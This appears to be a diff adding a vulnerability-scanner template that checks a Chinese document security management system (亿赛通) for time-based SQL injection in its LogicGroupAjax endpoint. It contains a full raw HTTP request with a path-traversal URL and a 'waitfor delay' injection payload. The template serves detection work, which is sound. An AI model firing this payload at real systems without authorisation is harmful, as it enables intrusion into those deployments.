@@ -1,0 +1,29 @@
+id: isaitong-logicalgroup-sqli
+
+info:
+  name: SQL Injection in LogicGroupAjax
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL injection vulnerability in the LogicGroupAjax endpoint of 亿赛通电子文档安全管理系统.
+    The injection leverages a time-based payload to verify the vulnerability.
+  tags: sql-injection, time-based, injection
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../LogicGroupAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=isExist&logicGroupName=-1'waitfor delay '0:0:5'--
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>5000" # Matches if the response delay exceeds 5 seconds.
